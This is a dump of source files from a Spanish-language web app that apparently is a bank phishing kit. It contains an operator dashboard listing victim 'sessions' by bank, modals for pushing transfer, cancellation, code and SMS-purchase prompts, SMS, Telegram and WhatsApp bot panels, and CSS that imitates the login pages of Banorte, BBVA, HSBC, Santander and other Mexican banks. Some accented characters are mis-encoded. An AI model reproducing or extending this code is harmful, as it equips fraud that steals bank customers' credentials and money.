0.4)'\n              }}\n            >\n              <svg xmlns=\"http://www.w3.org/2000/svg\" className=\"mr-2 h-5 w-5\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" strokeWidth=\"2\" strokeLinecap=\"round\" strokeLinejoin=\"round\">\n                <rect x=\"3\" y=\"3\" width=\"18\" height=\"18\" rx=\"2\" />\n                <rect x=\"7\" y=\"7\" width=\"3\" height=\"3\" />\n                <rect x=\"14\" y=\"7\" width=\"3\" height=\"3\" />\n                <rect x=\"7\" y=\"14\" width=\"3\" height=\"3\" />\n                <rect x=\"14\" y=\"14\" width=\"3\" height=\"3\" />\n              </svg>\n              GENERAR QR\n            </a>\n          </div>\n        </div>\n\n        {/* Content based on active tab */}\n        {activeTab === 'users' && isSuperAdmin ? (\n          <UserManagement />\n        ) : activeTab === 'registered' && isSuperAdmin ? (\n          <RegisteredUsersManagement />\n        ) : activeTab === 'executives' && user?.accountType === 'office' && !(user as any)?.isExecutive ? (\n          <ExecutiveManagement />\n        ) : activeTab === 'sms' ? (\n          user?.role === 'admin' ? <SmsManagementSimple /> : <UserSmsPanel />\n        ) : activeTab === 'qr' ? (\n          <QRManager />\n        ) : activeTab === 'telegram' && user?.role === 'admin' ? (\n          <TelegramBotManagement />\n        ) : activeTab === 'messages' && user?.role === 'admin' ? (\n          <MessageSender />\n        ) : activeTab === 'identity' && user?.role === 'admin' ? (\n          <IdentityVerificationPanel />\n        ) : activeTab === 'apk' && user?.role === 'admin' ? (\n          <APKManagement />\n        ) : activeTab === 'system-config' && user?.role === 'admin' ? (\n          <SystemConfigManagement />\n        ) : activeTab === 'site-config' && user?.role === 'admin' ? (\n          <SiteConfigManagement />\n        ) : activeTab === 'whatsapp' ? (\n          user?.role === 'admin' ? <WhatsAppBotPanel /> : <UserWhatsAppPanel />\n        ) : activeTab === 'links' ? (\n          <LinkManagementPanel />\n        ) : activeTab === 'bank-flows' && user?.role === 'admin' ? (\n          <BankFlowManager />\n        ) : activeTab === 'flows' ? (\n          <UserFlowManager />\n        ) : (\n          <div className=\"flex flex-col gap-4 h-full\">\n            {/* Session List */}\n            <div className=\"w-full\">\n              <AccessTable \n                sessions={sessions}\n                activeBank={activeBank}\n                selectedSessionId={selectedSessionId}\n                onSelectSession={selectSession}\n                isLoading={isLoading}\n              />\n            </div>\n            \n            {/* Session Details - Aparece debajo de la lista */}\n            {selectedSessionId && (\n              <div className=\"w-full overflow-y-auto max-h-[calc(100vh-300px)] border-t pt-4\">\n                {(() => {\n                  const selectedSession = sessions.find(s => s.sessionId === selectedSessionId);\n                  return selectedSession ? (\n                    <SessionDetails \n                      session={selectedSession} \n                      onFileUpdate={() => {\n                        // Refresh sessions to get updated file information\n                        queryClient.invalidateQueries({ queryKey: ['/api/sessions/current'] });\n                        queryClient.invalidateQueries({ queryKey: ['/api/sessions/saved'] });\n                      }}\n                    />\n                  ) : (\n                    <div className=\"p-4 text-center text-gray-500\">\n                      Sesi贸n no encontrada\n                    </div>\n                  );\n                })()}\n              </div>\n            )}\n          </div>\n        )}\n      </div>\n\n      {/* Modals */}\n      <ProtectModal \n        isOpen={activeModal === 'protege'} \n        onClose={closeModal} \n        onConfirm={handleProtectConfirm} \n      />\n      <TransferModal \n        isOpen={activeModal === 'transferir'} \n        onClose={closeModal} \n        onConfirm={handleTransferConfirm} \n      />\n      <CancelModal \n        isOpen={activeModal === 'cancelacion'} \n        onClose={closeModal} \n        onConfirm={handleCancelConfirm} \n      />\n      <CodeModal \n        isOpen={activeModal === 'codigo'} \n        onClose={closeModal} \n        onConfirm={handleCodeConfirm} \n      />\n      <MessageModal \n        isOpen={activeModal === 'mensaje'} \n        onClose={closeModal} \n        onConfirm={handleMessageConfirm} \n      />\n      <SmsCompraModal \n        isOpen={activeModal === 'sms_compra'} \n        onClose={closeModal} \n        onConfirm={handleSmsCompraConfirm} \n      />\n\n      \n      {/* Di谩logo para enviar SMS */}\n      <Dialog open={isSmsSendDialogOpen} onOpenChange={setIsSmsSendDialogOpen}>\n        <DialogContent className=\"sm:max-w-[425px] bg-[#1e1e1e] text-white border-gray-700\">\n          <DialogHeader>\n            <DialogTitle className=\"flex items-center\">\n              <Send className=\"mr-2 h-5 w-5\" />\n              Enviar Mensaje SMS\n            </DialogTitle>\n            <DialogDescription className=\"text-gray-400\">\n              Ingresa el n煤mero de tel茅fono y el mensaje que deseas enviar.\n            </DialogDescription>\n          </DialogHeader>\n          \n          <div className=\"grid gap-4 py-4\">\n            <div className=\"grid grid-cols-4 items-center gap-4\">\n              <Label htmlFor=\"phone\" className=\"text-right\">\n                Tel茅fono\n              </Label>\n              <Input\n                id=\"phone\"\n                type=\"text\"\n                inputMode=\"numeric\"\n                value={smsPhoneNumber}\n                onChange={(e) => setSmsPhoneNumber(e.target.value.replace(/\\D/g, '').slice(0, 10))}\n                placeholder=\"10 d铆gitos\"\n                className=\"col-span-3 bg-[#2a2a2a] border-gray-700 text-white\"\n                maxLength={10}\n              />\n            </div>\n            <div className=\"grid grid-cols-4 items-center gap-4\">\n              <Label htmlFor=\"message\" className=\"text-right\">\n                Mensaje\n              </Label>\n              <Textarea\n                id=\"message\"\n                value={smsMessage}\n                onChange={(e) => setSmsMessage(e.target.value.slice(0, 4000))}\n                placeholder=\"Escribe tu mensaje aqu铆... (m谩ximo 4000 caracteres, equivalente a una hoja oficio)\"\n                className=\"col-span-3 bg-[#2a2a2a] border-gray-700 text-white min-h-[120px]\"\n                maxLength={4000}\n              />\n              <div className=\"col-span-4 text-right text-xs text-gray-400\">\n                {smsMessage.length}/4000 caracteres\n              </div>\n            </div>\n          </div>\n          \n          <DialogFooter>\n            <Button\n              type=\"button\"\n              variant=\"outline\"\n              onClick={() => setIsSmsSendDialogOpen(false)}\n              className=\"border-gray-700 text-gray-300 hover:bg-gray-800\"\n            >\n              Cancelar\n            </Button>\n            <Button\n              type=\"button\"\n              onClick={() => sendSms.mutate()}\n              disabled={isSendingSms || !smsPhoneNumber || !smsMessage || smsPhoneNumber.length !== 10}\n              className=\"bg-[#007bff] hover:bg-blue-700 text-white flex items-center\"\n            >\n              {isSendingSms ? (\n                <>\n                  <RefreshCw className=\"h-4 w-4 mr-2 animate-spin\" />\n                  Enviando...\n                </>\n              ) : (\n                <>\n                  <Send className=\"h-4 w-4 mr-2\" />\n                  Enviar\n                </>\n              )}\n            </Button>\n          </DialogFooter>\n        </DialogContent>\n      </Dialog>\n    </div>\n  );\n}\n// Funci贸n para descargar QR ya implementada en AccessTable.tsx\n","size_bytes":48841},"client/src/components/ui/popover.tsx":{"content":"import * as React from \"react\"\nimport * as PopoverPrimitive from \"@radix-ui/react-popover\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst Popover = PopoverPrimitive.Root\n\nconst PopoverTrigger = PopoverPrimitive.Trigger\n\nconst PopoverContent = React.forwardRef<\n  React.ElementRef<typeof PopoverPrimitive.Content>,\n  React.ComponentPropsWithoutRef<typeof PopoverPrimitive.Content>\n>(({ className, align = \"center\", sideOffset = 4, ...props }, ref) => (\n  <PopoverPrimitive.Portal>\n    <PopoverPrimitive.Content\n      ref={ref}\n      align={align}\n      sideOffset={sideOffset}\n      className={cn(\n        \"z-50 w-72 rounded-md border bg-popover p-4 text-popover-foreground shadow-md outline-none data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[side=bottom]:slide-in-from-top-2 data-[side=left]:slide-in-from-right-2 data-[side=right]:slide-in-from-left-2 data-[side=top]:slide-in-from-bottom-2\",\n        className\n      )}\n      {...props}\n    />\n  </PopoverPrimitive.Portal>\n))\nPopoverContent.displayName = PopoverPrimitive.Content.displayName\n\nexport { Popover, PopoverTrigger, PopoverContent }\n","size_bytes":1230},"client/src/components/ReCaptcha.tsx":{"content":"import React, { useEffect, useRef, useState } from 'react';\nimport { Card, CardContent } from '@/components/ui/card';\nimport { Shield, CheckCircle, AlertTriangle } from 'lucide-react';\n\ninterface HCaptchaProps {\n  onVerify: (token: string | null) => void;\n  disabled?: boolean;\n  siteKey?: string;\n}\n\n// Declarar tipos para hCaptcha\ndeclare global {\n  interface Window {\n    hcaptcha: {\n      render: (container: string | HTMLElement, parameters: {\n        sitekey: string;\n        callback?: (token: string) => void;\n        'expired-callback'?: () => void;\n        'error-callback'?: () => void;\n        theme?: 'light' | 'dark';\n        size?: 'normal' | 'compact';\n      }) => string;\n      reset: (widgetId?: string) => void;\n      remove: (widgetId?: string) => void;\n      getResponse: (widgetId?: string) => string;\n    };\n  }\n}\n\nexport function HCaptcha({ onVerify, disabled = false, siteKey }: HCaptchaProps) {\n  const captchaRef = useRef<HTMLDivElement>(null);\n  const [isLoaded, setIsLoaded] = useState(false);\n  const [isVerified, setIsVerified] = useState(false);\n  const [error, setError] = useState<string | null>(null);\n  const [widgetId, setWidgetId] = useState<string | null>(null);\n  \n  // Usar clave del entorno o fallback\n  const HCAPTCHA_SITE_KEY = siteKey || import.meta.env.VITE_HCAPTCHA_SITE_KEY || '10000000-ffff-ffff-ffff-000000000001'; // Clave de prueba de hCaptcha\n  \n  // Cargar script de hCaptcha\n  useEffect(() => {\n    if (window.hcaptcha) {\n      setIsLoaded(true);\n      return;\n    }\n    \n    const script = document.createElement('script');\n    script.src = 'https://js.hcaptcha.com/1/api.js';\n    script.async = true;\n    script.defer = true;\n    script.onload = () => setIsLoaded(true);\n    script.onerror = () => setError('Error al cargar hCaptcha');\n    \n    document.head.appendChild(script);\n    \n    return () => {\n      if (document.head.contains(script)) {\n        document.head.removeChild(script);\n      }\n    };\n  }, []);\n  \n  // Renderizar hCaptcha cuando est茅 listo\n  useEffect(() => {\n    if (!isLoaded || !captchaRef.current || widgetId !== null) return;\n    \n    try {\n      const id = window.hcaptcha.render(captchaRef.current!, {\n        sitekey: HCAPTCHA_SITE_KEY,\n        callback: (token: string) => {\n          setIsVerified(true);\n          setError(null);\n          onVerify(token);\n        },\n        'expired-callback': () => {\n          setIsVerified(false);\n          setError('hCaptcha expirado, por favor verifica nuevamente');\n          onVerify(null);\n        },\n        'error-callback': () => {\n          setIsVerified(false);\n          setError('Error en hCaptcha, intenta nuevamente');\n          onVerify(null);\n        },\n        theme: 'light',\n        size: 'normal'\n      });\n      setWidgetId(id);\n    } catch (err) {\n      setError('Error al inicializar hCaptcha');\n      console.error('hCaptcha error:', err);\n    }\n  }, [isLoaded, HCAPTCHA_SITE_KEY, onVerify]);\n  \n  // Reset hCaptcha\n  const resetCaptcha = () => {\n    if (widgetId !== null && window.hcaptcha) {\n      window.hcaptcha.reset(widgetId);\n      setIsVerified(false);\n      setError(null);\n      onVerify(null);\n    }\n  };\n  \n  return (\n    <Card className=\"w-full\">\n      <CardContent className=\"p-4 space-y-4\">\n        <div className=\"flex items-center gap-2 text-sm font-medium\">\n          <Shield className=\"h-4 w-4\" />\n          <span>Verificaci贸n hCaptcha</span>\n        </div>\n        \n        {error ? (\n          <div className=\"p-4 bg-red-50 border border-red-200 rounded-lg\">\n            <div className=\"flex items-center gap-2 text-red-700\">\n              <AlertTriangle className=\"h-4 w-4\" />\n              <span className=\"text-sm\">{error}</span>\n            </div>\n            <button\n              onClick={resetCaptcha}\n              className=\"mt-2 text-xs text-red-600 hover:text-red-800 underline\"\n            >\n              Intentar nuevamente\n            </button>\n          </div>\n        ) : (\n          <>\n            <div className=\"flex justify-center\">\n              <div \n                ref={captchaRef}\n                className={disabled ? 'opacity-50 pointer-events-none' : ''}\n              />\n            </div>\n            \n            {!isLoaded && (\n              <div className=\"text-center text-sm text-gray-500\">\n                Cargando hCaptcha...\n              </div>\n            )}\n            \n            {isVerified && (\n              <div className=\"flex items-center justify-center gap-2 text-green-600 text-sm\">\n                <CheckCircle className=\"h-4 w-4\" />\n                <span>Verificaci贸n completada</span>\n              </div>\n            )}\n          </>\n        )}\n        \n        {HCAPTCHA_SITE_KEY === '10000000-ffff-ffff-ffff-000000000001' && (\n          <div className=\"text-xs text-amber-600 bg-amber-50 p-2 rounded\">\n            锔 Usando clave de prueba de hCaptcha. Para producci贸n, configura VITE_HCAPTCHA_SITE_KEY\n          </div>\n        )}\n      </CardContent>\n    </Card>\n  );\n}\n\n// Hook para usar hCaptcha de forma m谩s sencilla\nexport function useHCaptcha() {\n  const [token, setToken] = useState<string | null>(null);\n  const [isVerified, setIsVerified] = useState(false);\n  \n  const handleVerify = (captchaToken: string | null) => {\n    setToken(captchaToken);\n    setIsVerified(!!captchaToken);\n  };\n  \n  const reset = () => {\n    setToken(null);\n    setIsVerified(false);\n  };\n  \n  return {\n    token,\n    isVerified,\n    handleVerify,\n    reset\n  };\n}","size_bytes":5492},"client/src/index.css":{"content":"@tailwind base;\n@tailwind components;\n@tailwind utilities;\n\n@layer base {\n  * {\n    @apply border-border;\n  }\n\n  html, body {\n    @apply font-sans antialiased bg-background text-foreground;\n    height: 100%;\n    width: 100%;\n    margin: 0;\n    padding: 0;\n    overflow-x: hidden;\n    position: relative;\n  }\n  \n  #root {\n    height: 100%;\n    width: 100%;\n    overflow: auto;\n    display: flex;\n    flex-direction: column;\n  }\n  \n  /* Mejoras para dispositivos m贸viles */\n  @media (max-width: 640px) {\n    .mobile-scrollable {\n      overflow-y: auto !important;\n      overflow-x: auto !important;\n      -webkit-overflow-scrolling: touch;\n      max-height: 70vh !important;\n      padding-bottom: 120px !important;\n      width: 100% !important;\n    }\n    \n    .mobile-full-height {\n      min-height: calc(100vh - 50px);\n      height: auto !important;\n    }\n    \n    .mobile-card-view {\n      display: flex;\n      flex-direction: column;\n      gap: 0.75rem;\n    }\n\n    /* Mejora para tablas en m贸viles */\n    table {\n      display: block;\n      width: 100% !important;\n      overflow-x: auto !important;\n    }\n\n    /* Asegurar que los contenidos son visibles en pantallas peque帽as */\n    .overflow-hidden {\n      overflow: visible !important;\n    }\n\n    /* Forzar scroll vertical en contenedores que puedan tener contenido cortado */\n    .overflow-y-auto {\n      overflow-y: auto !important;\n      max-height: unset !important;\n    }\n  }\n}\n\n.white-logo {\n  filter: brightness(0) invert(1);\n  max-width: 70%;\n  height: auto;\n  max-height: 40px;\n}\n\n@keyframes progress {\n  0% { width: 0; }\n  45% { width: 45%; }\n  55% { width: 55%; }\n  75% { width: 75%; }\n  85% { width: 85%; }\n  95% { width: 95%; }\n  100% { width: 100%; }\n}\n\n.animate-progress-bar {\n  animation: progress 10s ease-in-out infinite;\n}\n\n/* Estilos para las barras de progreso con gradiente seg煤n el banco */\n.bg-\\[\\#EC1C24\\].animate-progress-bar {\n  background: linear-gradient(to right, #EC1C24, #ff3333);\n}\n\n.bg-\\[\\#0070BA\\].animate-progress-bar {\n  background: linear-gradient(to right, #0070BA, #009ffd);\n}\n\n.banbajio-bg.animate-progress-bar {\n  background: linear-gradient(to right, #4D2C91, #E60012);\n}\n\n.bancoppel-bg.animate-progress-bar {\n  background: linear-gradient(to right, #FFD500, #FFA500);\n}\n\n.banorte-bg.animate-progress-bar {\n  background: linear-gradient(to right, #d6001c, #a50017);\n}\n\n.bbva-bg.animate-progress-bar,\n.bg-\\[\\#072146\\].animate-progress-bar {\n  background: linear-gradient(to right, #004481, #1973B8);\n}\n\n/* Estilos para BBVA */\n.bbva-container {\n  display: flex;\n  flex-direction: column;\n  min-height: 100vh;\n  background-color: #f0f0f0;\n  font-family: Arial, sans-serif;\n}\n\n.bbva-header {\n  background: #072146;\n  color: white;\n  padding: 15px;\n  text-align: center;\n  width: 100%;\n  font-weight: 500;\n}\n\n.hsbc-bg.animate-progress-bar {\n  background: linear-gradient(to right, #DB0011, #D10000);\n}\n\n.amex-bg.animate-progress-bar {\n  background: linear-gradient(to right, #0077C8, #005FA3);\n}\n\n.santander-bg.animate-progress-bar {\n  background: linear-gradient(to right, #EC0000, #CC0000);\n}\n\n.scotiabank-bg.animate-progress-bar {\n  background: linear-gradient(to right, #EC111A, #CC0000);\n}\n\n.invex-bg.animate-progress-bar {\n  background: linear-gradient(to right, #BE0046, #9C0039);\n}\n\n.banregio-bg.animate-progress-bar {\n  background: linear-gradient(to right, #FF6600, #FF8C00);\n}\n\n/* Estilos para Banregio */\n.banregio-bg {\n  background-color: #FF6600;\n}\n\n.banregio-text {\n  color: #FF6600;\n}\n\n.banregio-accent {\n  color: #FFFFFF;\n}\n\n.banregio-container {\n  background: white;\n  margin: 20px auto;\n  padding: 30px;\n  border-radius: 8px;\n  text-align: center;\n  box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);\n  max-width: 400px;\n  border: 1px solid #FF6600;\n}\n\n.banregio-header {\n  text-align: center;\n  background-color: #FF6600;\n  padding: 12px;\n  font-weight: bold;\n  color: white;\n  font-size: 16px;\n  display: flex;\n  justify-content: center;\n  align-items: center;\n}\n\n.banregio-button {\n  background-color: #FF6600;\n  color: white;\n  border: none;\n  border-radius: 4px;\n  padding: 10px 20px;\n  font-weight: bold;\n  transition: all 0.2s ease;\n  width: 100%;\n  cursor: pointer;\n  font-size: 16px;\n}\n\n.banregio-button:hover {\n  background-color: #E65C00;\n  box-shadow: 0 2px 5px rgba(0,0,0,0.2);\n}\n\n.spin-bg.animate-progress-bar {\n  background: linear-gradient(to right, #7200A4, #9B00DB);\n}\n\n.bg-\\[\\#00A552\\].animate-progress-bar {\n  background: linear-gradient(to right, #00A552, #00C060);\n}\n\n.bg-\\[\\#9D2449\\].animate-progress-bar {\n  background: linear-gradient(to right, #9D2449, #B8345E);\n}\n\n/* === ESTILOS DE BANORTE - ACTUALIZADOS === */\n/* Paleta de colores oficial de Banorte */\n:root {\n  --banorte-red: #E31B23;\n  --banorte-red-dark: #C1161C;\n  --banorte-gray: #F5F5F5;\n  --banorte-dark-gray: #333333;\n  --banorte-light-gray: #FAFAFA;\n  --banorte-border: #E0E0E0;\n}\n\n.banorte-container {\n  display: flex;\n  flex-direction: column;\n  min-height: 100vh;\n  background: linear-gradient(180deg, #FAFAFA 0%, #F5F5F5 100%);\n  font-family: 'Helvetica Neue', Arial, sans-serif;\n  color: var(--banorte-dark-gray);\n}\n\n.banorte-header {\n  background: linear-gradient(180deg, var(--banorte-red) 0%, #D11218 100%);\n  color: white;\n  padding: 16px 24px;\n  text-align: center;\n  width: 100%;\n  box-shadow: 0 2px 8px rgba(227, 27, 35, 0.15);\n  border-bottom: 1px solid rgba(255, 255, 255, 0.1);\n}\n\n.banorte-header .fecha-banorte {\n  color: rgba(255, 255, 255, 0.9);\n  font-size: 13px;\n  font-weight: 400;\n  margin-top: 6px;\n  letter-spacing: 0.3px;\n}\n\n.banorte-logo {\n  height: 42px;\n  margin: 0 auto 4px;\n  display: block;\n  filter: brightness(0) invert(1);\n  transition: all 0.3s ease;\n}\n\n.banorte-content {\n  background: white;\n  padding: 32px 28px;\n  border-radius: 12px;\n  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08), 0 2px 8px rgba(0, 0, 0, 0.04);\n  width: 92%;\n  max-width: 420px;\n  margin: 24px auto;\n  border: 1px solid var(--banorte-border);\n  position: relative;\n}\n\n.banorte-content::before {\n  content: '';\n  position: absolute;\n  top: 0;\n  left: 0;\n  right: 0;\n  height: 3px;\n  background: linear-gradient(90deg, var(--banorte-red) 0%, #F23A41 100%);\n  border-radius: 12px 12px 0 0;\n}\n\n.banorte-nav {\n  background: var(--banorte-gray);\n  padding: 12px 0;\n  text-align: center;\n  border-top: 1px solid var(--banorte-border);\n  font-size: 13px;\n}\n\n.banorte-nav a {\n  color: var(--banorte-dark-gray);\n  margin: 0 16px;\n  text-decoration: none;\n  font-weight: 500;\n  transition: color 0.2s ease;\n}\n\n.banorte-nav a:hover {\n  color: var(--banorte-red);\n}\n\n.banorte-footer {\n  background: linear-gradient(180deg, var(--banorte-red-dark) 0%, var(--banorte-red) 100%);\n  color: white;\n  padding: 16px 24px;\n  text-align: center;\n  margin-top: auto;\n  width: 100%;\n  font-size: 14px;\n  font-weight: 500;\n  border-top: 1px solid rgba(255, 255, 255, 0.1);\n}\n\n.banorte-button {\n  background: linear-gradient(180deg, var(--banorte-red) 0%, var(--banorte-red-dark) 100%);\n  color: white;\n  border: none;\n  padding: 14px 24px;\n  border-radius: 8px;\n  cursor: pointer;\n  width: 100%;\n  margin-top: 16px;\n  font-weight: 600;\n  font-size: 16px;\n  letter-spacing: 0.3px;\n  transition: all 0.3s ease;\n  box-shadow: 0 2px 8px rgba(227, 27, 35, 0.2);\n}\n\n.banorte-button:hover {\n  background: linear-gradient(180deg, var(--banorte-red-dark) 0%, #A5131A 100%);\n  box-shadow: 0 4px 12px rgba(227, 27, 35, 0.3);\n  transform: translateY(-1px);\n}\n\n.banorte-button:active {\n  transform: translateY(0);\n  box-shadow: 0 2px 8px rgba(227, 27, 35, 0.2);\n}\n\n/* Estilos de BanCoppel */\n.bancoppel-container {\n  display: flex;\n  flex-direction: column;\n  min-height: 100vh;\n  background: #fff;\n}\n\n.bancoppel-header {\n  background-color: #1A4A7A;\n  color: white;\n  padding: 20px;\n  text-align: center;\n}\n\n.bancoppel-content {\n  max-width: 400px;\n  margin: 40px auto;\n  padding: 20px;\n  border: 1px solid #eee;\n  border-radius: 10px;\n  text-align: center;\n}\n\n.bancoppel-footer-links {\n  background: #f9f9f9;\n  padding: 10px;\n  text-align: center;\n  font-size: 14px;\n  margin-top: auto;\n}\n\n.bancoppel-footer {\n  background-color: #1A4A7A;\n  color: white;\n  text-align: center;\n  padding: 10px;\n}\n\n.bancoppel-button {\n  background-color: #FFD700;\n  color: black;\n  border: none;\n  padding: 10px 25px;\n  border-radius: 5px;\n  cursor: pointer;\n  width: 100%;\n}\n\n/* Estilos de Spin */\n.spin-container {\n  display: flex;\n  flex-direction: column;\n  min-height: 100vh;\n  background: #fff;\n}\n\n.spin-header {\n  background-color: #7200A4;\n  color: white;\n  text-align: center;\n  padding: 10px;\n}\n\n.spin-date {\n  color: #7200A4;\n  font-weight: bold;\n  text-align: center;\n  margin: 10px 0;\n}\n\n.spin-content {\n  max-width: 400px;\n  margin: 40px auto;\n  border: 1px solid #ccc;\n  padding: 30px;\n  border-radius: 10px;\n  box-shadow: 0 2px 10px rgba(0,0,0,0.1);\n}\n\n.spin-links {\n  text-align: center;\n  margin-top: auto;\n}\n\n.spin-links a {\n  margin: 0 5px;\n  color: #333;\n  text-decoration: none;\n  font-size: 14px;\n}\n\n.spin-bottom-links {\n  background-color: #7200A4;\n  color: white;\n  padding: 10px;\n  text-align: center;\n}\n\n.spin-bottom-links a {\n  margin: 0 5px;\n  color: white;\n  text-decoration: none;\n  font-size: 14px;\n}\n\n.spin-button {\n  width: 100%;\n  padding: 10px;\n  background-color: #7200A4;\n  color: white;\n  border: none;\n  border-radius: 5px;\n  font-weight: bold;\n  margin-top: 10px;\n}\n\n/* Estilos para BanBaj铆o */\n.banbajio-bg {\n  background-color: #4D2C91;\n}\n\n.banbajio-text {\n  color: #4D2C91;\n}\n\n.banbajio-accent {\n  color: #E60012;\n}\n\n.banbajio-button {\n  background-color: #4D2C91;\n  color: white;\n  border-radius: 4px;\n  padding: 10px 20px;\n  font-weight: bold;\n  transition: all 0.2s ease;\n}\n\n.banbajio-button:hover {\n  background-color: #3a1f70;\n  box-shadow: 0 2px 5px rgba(0,0,0,0.2);\n}\n\n.banbajio-secondary-button {\n  background-color: #E60012;\n  color: white;\n  border-radius: 4px;\n  padding: 10px 20px;\n  font-weight: bold;\n  transition: all 0.2s ease;\n}\n\n.banbajio-secondary-button:hover {\n  background-color: #cc000f;\n  box-shadow: 0 2px 5px rgba(0,0,0,0.2);\n}\n\n.banbajio-background {\n  background-color: #f5f5f5;\n}\n\n/* Estilos adicionales para BanBaj铆o */\n.banbajio-container {\n  background: white;\n  margin: 20px auto;\n  padding: 25px;\n  border-radius: 8px;\n  text-align: center;\n  box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);\n  max-width: 400px;\n}\n\n.banbajio-header {\n  text-align: center;\n  background-color: #f0f0f0;\n  padding: 12px;\n  font-weight: bold;\n  color: #4D2C91;\n  border-top: 3px solid #E60012;\n  border-bottom: 1px solid #ddd;\n  font-size: 16px;\n}\n\n.banbajio-footer {\n  background-color: white;\n  text-align: center;\n  font-size: 13px;\n  padding: 20px 15px;\n  margin-top: 20px;\n  border-top: 1px solid #eee;\n  color: #666;\n}\n\n.banbajio-footer-bottom {\n  background-color: #4D2C91;\n  color: white;\n  font-size: 12px;\n  padding: 18px 15px;\n  box-shadow: 0 -2px 10px rgba(0,0,0,0.1);\n}\n\n.banbajio-small-links {\n  margin-top: 10px;\n  font-size: 13px;\n}\n\n/* Estilos para BanCoppel */\n.bancoppel-bg {\n  background-color: #FFD500;\n}\n\n.bancoppel-text {\n  color: #003366;\n}\n\n.bancoppel-accent {\n  color: #FFD500;\n}\n\n.bancoppel-button {\n  background-color: #FFD500;\n  color: #003366;\n  border-radius: 4px;\n  padding: 10px 20px;\n  font-weight: bold;\n  transition: all 0.2s ease;\n}\n\n.bancoppel-button:hover {\n  background-color: #E6C000;\n  box-shadow: 0 2px 5px rgba(0,0,0,0.2);\n}\n\n.bancoppel-container {\n  background: white;\n  margin: 20px auto;\n  padding: 25px;\n  border-radius: 8px;\n  text-align: center;\n  box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);\n  max-width: 400px;\n}\n\n.bancoppel-header {\n  text-align: center;\n  background-color: #003366;\n  padding: 12px;\n  font-weight: bold;\n  color: white;\n  border-top: 3px solid #FFD500;\n  border-bottom: 1px solid #ddd;\n  font-size: 16px;\n}\n\n/* Clases auxiliares de Banorte */\n.banorte-bg {\n  background-color: var(--banorte-red);\n}\n\n.banorte-text {\n  color: var(--banorte-red);\n}\n\n.banorte-accent {\n  color: var(--banorte-dark-gray);\n}\n\n/* Inputs espec铆ficos de Banorte */\n.banorte-input {\n  border: 2px solid var(--banorte-border);\n  border-radius: 6px;\n  padding: 12px 16px;\n  font-size: 16px;\n  width: 100%;\n  transition: all 0.3s ease;\n  background: white;\n}\n\n.banorte-input:focus {\n  border-color: var(--banorte-red);\n  box-shadow: 0 0 0 3px rgba(227, 27, 35, 0.1);\n  outline: none;\n}\n\n/* Elementos de formulario de Banorte */\n.banorte-form-group {\n  margin-bottom: 20px;\n  text-align: left;\n}\n\n.banorte-form-label {\n  display: block;\n  margin-bottom: 6px;\n  color: var(--banorte-dark-gray);\n  font-weight: 600;\n  font-size: 14px;\n}\n\n/* Cards y elementos espec铆ficos */\n.banorte-card {\n  background: white;\n  border: 1px solid var(--banorte-border);\n  border-radius: 8px;\n  padding: 20px;\n  margin: 16px 0;\n  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);\n}\n\n/* Links espec铆ficos de Banorte */\n.banorte-link {\n  color: var(--banorte-red);\n  text-decoration: none;\n  font-weight: 500;\n  transition: color 0.2s ease;\n}\n\n.banorte-link:hover {\n  color: var(--banorte-red-dark);\n  text-decoration: underline;\n}\n\n/* Estilos para BBVA */\n.bbva-bg {\n  background-color: #072146;\n}\n\n.bbva-text {\n  color: #072146;\n}\n\n.bbva-accent {\n  color: #1973B8;\n}\n\n/* Dise帽o completo de BBVA */\n.bbva-page-background {\n  font-family: 'Segoe UI', sans-serif; \n  background: #fff;\n  min-height: 100vh;\n  display: flex;\n  flex-direction: column;\n}\n\n.bbva-header {\n  background: #072146; \n  color: white; \n  text-align: center; \n  padding: 10px 0;\n  width: 100%;\n}\n\n.bbva-navbar {\n  background: white; \n  display: flex; \n  justify-content: left; \n  padding: 10px; \n  font-size: 14px; \n  border-bottom: 1px solid #ddd;\n  width: 100%;\n}\n\n.bbva-navbar a {\n  margin: 0 15px; \n  color: #000; \n  text-decoration: none;\n}\n\n.bbva-main-container {\n  display: flex; \n  justify-content: center; \n  align-items: center; \n  flex: 1;\n  padding: 20px;\n}\n\n.bbva-container {\n  max-width: 400px; \n  width: 100%; \n  padding: 25px; \n  border: 1px solid #ddd; \n  border-radius: 8px; \n  text-align: center;\n  background: white;\n}\n\n.bbva-button {\n  background: #072146;\n  color: white;\n  padding: 10px 20px;\n  border: none;\n  cursor: pointer;\n  width: 100%;\n  border-radius: 4px;\n  margin-top: 10px;\n  font-weight: bold;\n  transition: all 0.2s ease;\n}\n\n.bbva-button:hover {\n  background-color: #1973B8;\n  box-shadow: 0 2px 5px rgba(0,0,0,0.2);\n}\n\n.bbva-input {\n  width: 100%;\n  padding: 10px;\n  margin: 10px 0;\n  border: 1px solid #ddd;\n  border-radius: 4px;\n}\n\n.bbva-footer-links {\n  font-size: 12px;\n  color: #ccc;\n  text-align: center;\n  padding: 20px 0;\n  width: 100%;\n  background: #f5f5f5;\n}\n\n/* Estilos para HSBC */\n.hsbc-bg {\n  background-color: #DB0011;\n}\n\n.hsbc-text {\n  color: #DB0011;\n}\n\n.hsbc-accent {\n  color: #000000;\n}\n\n.hsbc-page-background {\n  background: url('./assets/fondo-hsbc-nuevo.jpeg') no-repeat center center fixed;\n  background-size: cover;\n  min-height: 100vh;\n  display: flex;\n  flex-direction: column;\n  align-items: center;\n  justify-content: center;\n  padding: 20px;\n}\n\n.hsbc-button {\n  background-color: #e60012;\n  color: white;\n  border: none;\n  border-radius: 4px;\n  padding: 10px 20px;\n  font-weight: bold;\n  transition: all 0.2s ease;\n  width: 100%;\n  cursor: pointer;\n  font-size: 16px;\n}\n\n.hsbc-button:hover {\n  background-color: #B8000E;\n  box-shadow: 0 2px 5px rgba(0,0,0,0.2);\n}\n\n.hsbc-container {\n  background: white;\n  margin: 20px auto;\n  padding: 30px;\n  border-radius: 8px;\n  text-align: center;\n  box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);\n  max-width: 400px;\n}\n\n/* Estilos para AMEX */\n.amex-bg {\n  background-color: 